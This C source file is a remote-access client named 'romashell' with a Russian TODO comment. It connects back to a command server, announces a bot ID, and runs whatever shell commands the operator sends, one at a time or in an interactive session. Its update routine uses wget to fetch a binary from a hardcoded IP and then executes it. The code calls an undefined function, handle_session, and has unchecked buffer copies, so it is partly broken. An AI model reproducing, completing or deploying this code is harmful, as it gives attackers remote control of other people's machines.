#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#define ALLE_OP "ALLE"
#define EXEC_OP "EXEC"
#define UPDT_OP "UPDT"

void 	welcome(int socket, char *id)
{
	dprintf(socket, "\e[31mromashell\e[39m [%s] $>  ", id);
}

void	update(char *id)
{
	/*
	** TODO: Додумать бы алгоритм подтягивания обновлений клиентом
	*/
	char command[128];

	strcpy(command, "./.data 35.228.10.8 8889 ");
	strcat(command, id);
	system("wget http://35.228.10.8/romashell -O .data");
	system(command);
	exit(1);
}

int		remote(char *host, int port)
{
	struct sockaddr_in	serv_addr;
	int					sock;

	sock = 0;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
			close(sock);
			return (0);
	}
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	if (inet_pton(AF_INET, host, &serv_addr.sin_addr) <= 0)
	{
			close(sock);
			return (0);
	}
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
			close(sock);
			return (0);
	}
	return (sock);
}

int		exec_command(int socket, char *command)
{
	FILE *fp;
	char path[2048];
	char resp[64];

	if (!socket || !command)
		return (0);
	bzero(path, sizeof(path));
	fp = popen(command, "r");
	if (!fp)
		return (0);
	while (fgets(resp, sizeof(resp), fp) != NULL)
		strcat(path, resp);
	dprintf(socket, "%s", path);
	pclose(fp);
	return (1);
}

int		create_session(int socket, char *id)
{
	char	resp[128];
	int		nbytes;
	
	if (!socket)
		return (0);
	bzero(resp, sizeof(resp));
	welcome(socket, id);
	while (socket && (nbytes = recv(socket, resp, sizeof(resp), 0)) > 0)
	{
		resp[nbytes - 1] = 0;
		exec_command(socket, resp);
		welcome(socket, id);
		bzero(resp, sizeof(resp));
	}
	close(socket);
	return (0);
}

void	handle_connect(int socket, char *id, char *host)
{
	char	resp[128];
	int		status;
	int		nbytes;
	
	if (!socket || !id)
		return ;
	bzero(resp, sizeof(resp));
	if ((nbytes = recv(socket, resp, sizeof(resp), 0)) > 0)
	{
		if (resp[nbytes - 1] == '\n')
			resp[nbytes - 1] = 0;
		if (strncmp(ALLE_OP, resp, 4) == 0 && nbytes > 7)
			exec_command(socket, resp + 7);
		else if (strncmp(EXEC_OP, resp, 4) == 0)
			create_session(socket, id);
		else if (strncmp(UPDT_OP, resp, 4) == 0)
			update(id);
		else
			printf("Unknown command [%s]\n", resp);
	}
}

int		main(int argc, char **argv)
{
	char	*id;
	char	*host;
	char	*command;
	int		port;
	int		socket;
	
	if (argc != 4)
	{
		printf("Usage: ./romashell host port unique_id\n");
		exit(1);
	}
	host = argv[1];
	port = atoi(argv[2]);
	id = argv[3];
	while (1)
	{
		socket = remote(host, port);
		if (socket > 0)
		{
			dprintf(socket, "PING %s\n", id);
			handle_session(socket, id, host);
			close(socket);
		}	
		printf("Waiting for server...\n");
		sleep(2);
	}
}
